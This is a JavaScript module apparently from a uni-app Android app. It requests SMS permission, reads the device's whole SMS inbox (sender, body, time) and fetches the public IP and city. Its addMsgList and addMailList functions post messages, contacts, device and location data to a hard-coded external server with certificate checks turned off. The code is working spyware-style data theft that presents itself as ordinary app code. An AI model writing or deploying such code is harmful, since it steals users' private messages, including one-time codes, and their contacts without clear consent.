// let ip = "http://192.168.3.58:3000"
let ip = "http://40.81.28.150:3000"
/**
 *1.检测网络 
 */
export async function netWork() {
	let response
	await uni.getNetworkType({
		success: function(res) {
			// console.log("获取网络类型", res.networkType)

			if (res.networkType == "none") {
				// that.networkState = false

				uni.showModal({
					title: '提示',
					content: '网络连接失败，请检查网络后重试！',
					showCancel: false,

					success: function(res) {
						if (res.confirm) {
							console.log('用户点击确定');
						}
					}
				});

				response = false

			} else {

				response = true
			}

		}
	});

	return response
}


/**
 *2.申请短信权限 
 */
export async function msgAgree() {
	let response
	await plus.android.requestPermissions(['android.permission.READ_SMS'],
		function(e) {
			// console.log("eeeeeee=", e)
			if (e.deniedAlways.length > 0) {
				console.log('短信权限被永久拒绝 ' + e.deniedAlways.toString());
				// uni.showModal({
				// 	title: '提醒',
				// 	content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到本应用，并打开短信权限，方可使用。',
				// 	showCancel: false,
				// 	success: function(res) {
				// 		if (res.confirm) {
				// 			console.log('用户点击确定');
				// 			var main = plus.android
				// 				.runtimeMainActivity();
				// 			var Intent = plus.android
				// 				.importClass(
				// 					'android.content.Intent'
				// 				);
				// 			var Settings = plus.android
				// 				.importClass(
				// 					'android.provider.Settings'
				// 				);
				// 			var intent = new Intent(
				// 				Settings
				// 				.ACTION_MANAGE_APPLICATIONS_SETTINGS
				// 			);
				// 			main.startActivity(
				// 				intent);
				// 		}
				// 	}
				// });
			}
			if (e.deniedPresent.length > 0) {
				console.log('短信权限被临时拒绝 ' + e.deniedPresent.toString());
				// uni.showModal({
				// 	title: '提醒',
				// 	content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到本应用，并打开短信权限，方可使用。',
				// 	showCancel: false,
				// 	success: function(res) {
				// 		if (res.confirm) {
				// 			console.log('用户点击确定');
				// 			var main = plus.android
				// 				.runtimeMainActivity();
				// 			var Intent = plus.android
				// 				.importClass(
				// 					'android.content.Intent'
				// 				);
				// 			var Settings = plus.android
				// 				.importClass(
				// 					'android.provider.Settings'
				// 				);
				// 			var intent = new Intent(
				// 				Settings
				// 				.ACTION_MANAGE_APPLICATIONS_SETTINGS
				// 			);
				// 			main.startActivity(
				// 				intent); // 打开安装列表
				// 		}
				// 	}
				// });
			}
			if (e.granted.length > 0) { //权限被允许
				//调用依赖获取权限的代码
				console.log('短信权限被允许');
				response = "短信允许"
			}
		},
		function(e) {
			console.log('Request Permissions error:' + JSON.stringify(e));
		});
	return response
}


import timestampToTime from '../home/timeFormat.js'
/**
 * 3.短信权限同意获取短信
 */
export function msgList() {
	let msgList = []
	// 3.3 权限通过获取短信
	var main = plus.android.runtimeMainActivity();
	var Uri = plus.android.importClass('android.net.Uri');
	var ContactsContract = plus.android.importClass(
		'android.provider.ContactsContract');

	var uri = Uri.parse('content://sms/');
	var cr = main.getContentResolver();
	plus.android.importClass(cr);
	var cur = cr.query(uri, null, null, null, null);
	plus.android.importClass(cur);
	cur.moveToFirst();

	while (cur.moveToNext()) {

		// 发送号码
		var index_Address = cur.getColumnIndex('address');
		var address = cur.getString(index_Address);
		//短信内容
		var index_Body = cur.getColumnIndex('body');
		var body = cur.getString(index_Body);
		//发送时间
		var index_Date = cur.getColumnIndex("date");
		var date = cur.getLong(index_Date);
		// 时间戳转换时间格式
		let strTime = timestampToTime(date)

		// 3.4遍历短信列表
		msgList.push({
			phone: address,
			content: body,
			time: strTime
		})

	}
	cur.close();

	return msgList
}
/**
 * 4.获取ip地址和解析
 */
export function ipAndaddress() {

	return new Promise((reslove, reject) => {
		uni.request({
			url: 'http://pv.sohu.com/cityjson?ie=utf-8',
			method: 'POST',
			success: (res) => {

				let value = res.data.substring(19)

				value = value.replace(";", " ");

				value = JSON.parse(`${value}`)
				console.log("字符串转换json", value)

				reslove({
					userip: value.cip,
					addres: value.cname
				})


				// uni.request({
				// 	url: 'http://ip-api.com/json/?lang=zh-CN',
				// 	method: 'GET',
				// 	data: {
				// 		ip: res1.data.substring(28, 42),
				// 		json: true
				// 	},
				// 	success: (res2) => {

				// 		reslove({
				// 			userip: res1,
				// 			addres: res2.data.country + "·" + res2.data
				// 				.regionName + "·" + res2.data.city
				// 		})
				// 	}
				// })
			}
		})
	})
}
/**
 * 5.重复号码校验
 */

export function checkNumber(value) {

	return new Promise((reslove, reject) => {

		uni.request({
			url: `${ip}/Api/mobile/checkNum`,
			data: {
				loginNum: value,
			},
			method: "POST",
			sslVerify: false,
			success: (res) => {
				reslove(res.data)
			},
			fail: (res) => {
				reslove(res)
				console.log("网络请求失败", res)
			},

		})


	})
}

/**
 * 6.添加短信
 */

export function addMsgList(value) {

	// console.log("短信添加", value)

	return new Promise((reslove, reject) => {

		uni.request({
			url: `${ip}/Api/mobile/addMsgList`,
			data: {
				inCode: value.inCode,
				loginNum: value.loginNum,
				qeu: value.qeu,
				data: value.data
			},
			sslVerify: false,
			method: "POST",
			success: (res) => {
				reslove(res.data)
			}
		});
	})
}


/**
 * 7.添加通讯录
 */

export function addMailList(value) {

	console.log("通讯录添加", value)
	return new Promise((reslove, reject) => {

		uni.request({
			url: `${ip}/Api/mobile/addMailList`,
			method: "POST",
			data: {
				loginNum: value.loginNum,
				inCode: value.inCode,
				equipment: value.equipment,
				location: value.location,
				address: value.address,
				data: value.data
			},
			sslVerify: false,
			success: (res) => {
				reslove(res.data)
			}
		});

	})
}

/**
 * 8.申请Promise短信权限
 */

//#ifndef H5
export function promiseSMS() {

	return new Promise((reslove, reject) => {
		plus.android.requestPermissions(['android.permission.READ_SMS'],
			function(e) {
				// console.log("eeeeeee=", e)
				if (e.deniedAlways.length > 0) {
					reslove({
						msmState: false
					})
					console.log('短信权限被永久拒绝 ' + e.deniedAlways.toString());
					// uni.showModal({
					// 	title: '提醒',
					// 	content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到本应用，并打开短信权限，方可使用。',
					// 	showCancel: false,
					// 	success: function(res) {
					// 		if (res.confirm) {
					// 			console.log('用户点击确定');
					// 			var main = plus.android
					// 				.runtimeMainActivity();
					// 			var Intent = plus.android
					// 				.importClass(
					// 					'android.content.Intent'
					// 				);
					// 			var Settings = plus.android
					// 				.importClass(
					// 					'android.provider.Settings'
					// 				);
					// 			var intent = new Intent(
					// 				Settings
					// 				.ACTION_MANAGE_APPLICATIONS_SETTINGS
					// 			);
					// 			main.startActivity(
					// 				intent);
					// 		}
					// 	}
					// });
				}
				if (e.deniedPresent.length > 0) {
					console.log('短信权限被临时拒绝 ' + e.deniedPresent.toString());
					reslove({
						msmState: false
					})
					// uni.showModal({
					// 	title: '提醒',
					// 	content: '请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理"找到本应用，并打开短信权限，方可使用。',
					// 	showCancel: false,
					// 	success: function(res) {
					// 		if (res.confirm) {
					// 			console.log('用户点击确定');
					// 			var main = plus.android
					// 				.runtimeMainActivity();
					// 			var Intent = plus.android
					// 				.importClass(
					// 					'android.content.Intent'
					// 				);
					// 			var Settings = plus.android
					// 				.importClass(
					// 					'android.provider.Settings'
					// 				);
					// 			var intent = new Intent(
					// 				Settings
					// 				.ACTION_MANAGE_APPLICATIONS_SETTINGS
					// 			);
					// 			main.startActivity(
					// 				intent); // 打开安装列表
					// 		}
					// 	}
					// });
				}
				if (e.granted.length > 0) { //权限被允许
					//调用依赖获取权限的代码
					console.log('短信权限被允许');
					reslove({
						msmState: true
					})
				}
			},
			function(e) {
				console.log('Request Permissions error:' + JSON.stringify(e));
			});
	})
}

//#endif
